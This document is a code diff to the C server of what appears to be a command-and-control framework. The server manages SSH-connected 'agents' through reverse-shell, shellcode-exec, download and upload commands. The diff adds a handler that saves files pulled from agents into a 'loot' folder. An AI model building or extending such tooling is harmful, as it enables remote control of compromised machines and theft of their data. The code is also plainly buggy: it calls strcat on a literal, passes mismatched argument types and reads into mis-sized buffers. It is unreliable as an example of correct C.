@@ -202,120 +202,38 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
 static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 #endif /* HAVE_ARGP_H */
 
-int index_of(char* str, char find){
-    int i = 0;
-
-    while (str[i] != '\0')
+int index_of(char* str, char find, int rev){
+    if (rev)
     {
-        if (str[i] == find)
-        {
-            return i;
+        int end = strlen(str);
+        int ctr = 0;
+        while(end - ctr > 0){
+            if(str[end-ctr] == find){
+                return end - ctr;
+            }
+            ctr++;
         }
-
-        i++;
-    }
-
-    return -1;
-
-}
-
-int parse_command(char* comm, struct clientDat clistruct){
-    char main[16];
-    char params[4096];
-    int rc = -1;
-
-    rc = index_of(comm, ' ');
-
-    if (rc<0)
-    {
-        printf("Illegal command passsed to server\n");
         return -1;
-    }
+    } else {
+        int i = 0;
 
-    strncpy(main, comm, rc);
-
-    // in case the command string is larger than the receiving buffer
-    if (strlen(comm) > 4096)
-    {
-/*MAYBE AT SOME POINT REPLACE THIS WITH IT ALL BEING LOADED INTO MEMORY OR SOMETHING???*/
-        strncat(params, comm+rc+1, 4096-rc+1);
-    } else
-    {
-        strncat(params, comm+rc+1, strlen(comm) - rc+1);
-    }
-    
-    
-    if (clistruct.type == AGENT_TYPE)
-    {
-        // Agent commands
-        if (strcmp(main, "download")) {
-            // Downloads a file from the client
-            int size = 0;
-            int recv = 0;
-            struct stat st = {0};
-            
-            
-            // gets file size from client
-            ssh_channel_read(clistruct.chan, &size, 2056, 0);
-
-            // allocates memory for file contents
-            unsigned char* data = malloc(size); 
-            ssh_channel_write(clistruct.chan, "ok", 3);
-            int nbytes = 0;
-
-            // read the data
-            while (nbytes < size)
+        while (str[i] != '\0')
+        {
+            if (str[i] == find)
             {
-                recv = ssh_channel_read(clistruct.chan, data, sizeof(data), 0);
-                if (recv == SSH_ERROR)
-                {
-                    printf("Failed to read data from channel\n");
-                    return -1;
-                }
-                nbytes += recv;
-                
+                return i;
             }
 
-            if (stat("agent_files", &st) == -1)
-            {
-                mkdir("agent_files", 0666);
-            } 
-
-            char formatstr[FILENAME_MAX] = "client%d_%d.data";
-            char filename[FILENAME_MAX];
-            
-            sprintf(filename, formatstr, clistruct.id, clistruct.trans_id);
-            
-
-            FILE* fd = fopen(filename, "wb");
-
-            fprintf(fd, data);
-            fclose(fd);            
-            
-
-            // send ok 
-            ssh_channel_write(clistruct.chan, "ok", 3);
-            
-
-            return AGENT_DOWN_FILE;
-        } else if (strcmp(main, "shell")) {
-            return AGENT_REV_SHELL;
-        } else if (strcmp(main, "exec")) {
-            return AGENT_EXEC_SC;
-        } else if (strcmp(main, "upload")) {
-            return AGENT_UP_FILE;
-        } else if (strcmp(main, "end"))
-        {
-            return END_CONN;
+            i++;
         }
-        
-    } else if (clistruct.type == MANAG_TYPE) {
-        printf("TYPE = MANAGER\n");        
+
+        return -1;
     }
+    
+    
 
-
-    return -1;
 }
+
 
 int directory_exists( const char* pzPath ){
     /*Tests if a directory exists in the file system */
@@ -377,13 +295,36 @@ int get_file(char *name, char *ptr){
 
 }
 
-void agent_handler(int resp, struct clientDat agent){
+void clean_input(char *input){
+    int offset = index_of(input, "/", 1);
+    input = input +offset;
+}
+
+void agent_handler(struct clientDat agent){
+    char resp[2048];
+    char *ptr = &resp;
+
+    int operation = -1;
     int quitting = 0;
     char buff[2048];
             
     while (!quitting)
     {
-        switch (resp)
+        ssh_channel_read(agent.chan, resp, sizeof(resp), 0);
+        operation = (int) resp[0];
+        ptr++;
+
+        /*
+        Command data structure:
+            First char: 
+                Describes what command it is
+            Following chars:
+                Optional values, separated by ',' chars
+            Terminating sequence:   
+                NULL
+        */
+
+        switch (operation)
         {
         case AGENT_EXIT:
             pthread_mutex_lock(&session_lock);
@@ -418,8 +359,35 @@ void agent_handler(int resp, struct clientDat agent){
             // writes file 
             ssh_channel_write(agent.chan, dat_ptr, size);
 
-            // gets next tasking
-            ssh_channel_read(agent.chan, &resp, 256, 0);
+            break;
+
+        case AGENT_UP_FILE:
+            /*ADD CHECKS IN HERE FOR SAFETY*/
+            
+            // gets file name
+            ssh_channel_write(agent.chan, "fn", 3);
+            char filename[2048];
+            ssh_channel_read(agent.chan, filename, sizeof(filename), 0);
+            
+            // get size and allocate memory segment
+            int size = 0;
+            ssh_channel_write(agent.chan, "ok", 3);
+            ssh_channel_read(agent.chan, (char *) &size, 1, 0);
+            char *data_ptr = malloc(size);
+            memset(data_ptr, 0, size);
+            
+            // writes file size
+            ssh_channel_write(agent.chan, "ok", 3);
+            ssh_channel_read(agent.chan, buff, size, 0);
+
+            // writes file 
+            ssh_channel_write(agent.chan, "ok", 3);
+            FILE *file;
+            clean_input(filename);
+            strcat("loot/", filename);
+            file = fopen(filename, "wb");
+            fwrite(data_ptr, 1, size, file);
+            fclose(file);
             break;
 
         case AGENT_EXEC_SC:
@@ -428,10 +396,9 @@ void agent_handler(int resp, struct clientDat agent){
         case AGENT_REV_SHELL:
             break;
 
-        case AGENT_UP_FILE:
-            break;
-
         default:
+            printf("Client %d: Unknown operation value '%d'\n", agent.id, operation); 
+            ssh_channel_write(agent.chan, "un", 3);
             break;
         }
     }
@@ -544,10 +511,9 @@ void *ssh_handler(void* sess){
         get_tasking(agent_id, tasking);
 
         ssh_channel_write(pass.chan, tasking, strlen(tasking));
-        ssh_channel_read(pass.chan, &resp, sizeof(resp), 0);
-
-        // Parse input
-        agent_handler(resp, pass);
+        
+        // Pass to handler
+        agent_handler(pass);
         
         break;
     default:
